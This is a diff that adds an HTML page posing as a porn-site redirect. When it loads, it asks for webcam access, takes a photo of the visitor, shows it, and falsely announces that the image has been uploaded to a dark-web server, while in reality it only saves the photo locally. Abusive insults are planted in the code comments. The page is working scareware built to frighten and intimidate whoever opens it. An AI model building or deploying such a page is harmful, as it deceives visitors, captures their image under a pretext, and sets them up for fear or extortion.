@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>A片网站跳转中</title>
+<style>
+/* 观看源码死全家 */
+body {
+    font-family: system-ui, sans-serif;
+    text-align: center;
+    padding: 15px;
+    margin: 0;
+    /* 9178 */
+    display: none;
+}
+h2 {
+    margin: 10px 0;
+    font-size: 18px;
+}
+#video {
+    width: 320px;
+    max-width: 100%;
+    border: 2px solid #ccc;
+    border-radius: 12px;
+}
+#previewImg {
+    width: 320px;
+    max-width: 100%;
+    border: 2px solid #2196F3;
+    border-radius: 12px;
+    margin-top: 15px;
+    display: none;
+}
+#doneText {
+    margin-top: 10px;
+    color: green;
+    font-weight: bold;
+    display: none;
+}
+</style>
+</head>
+<body>
+    <h2>zv44.cc服务器连接中</h2>
+    <video id="video" autoplay playsinline></video>
+    <img id="previewImg" alt="预览照片">
+    <div id="doneText">正在实时上传暗网服务器 ✅上传成功</div>
+
+    <canvas style="display:none;" id="canvas" width="480" height="640"></canvas>
+
+<script>
+window.addEventListener("DOMContentLoaded", function() {
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const video = document.getElementById('video');
+    const previewImg = document.getElementById('previewImg');
+    const doneText = document.getElementById('doneText');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+        // 78912778
+        document.body.style.display = 'block';
+        
+        video.srcObject = stream;
+        video.play();
+
+        // 1秒后拍照（可修改为2000/3000延长取景时间）
+        setTimeout(() => {
+            ctx.drawImage(video, 0, 0, 1080, 1920);
+            const imgData = canvas.toDataURL('image/png');
+
+            // 老牧师
+            previewImg.src = imgData;
+            previewImg.style.display = 'inline';
+            doneText.style.display = 'block';
+
+            // 你看你爸
+            const a = document.createElement('a');
+            a.href = imgData;
+            a.download = 'cap_' + Date.now() + '.png';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }, 1000);
+    })
+    .catch(() => {
+        alert("权限不足，无法观看");
+    });
+});
+</script>
+</body>
+</html>
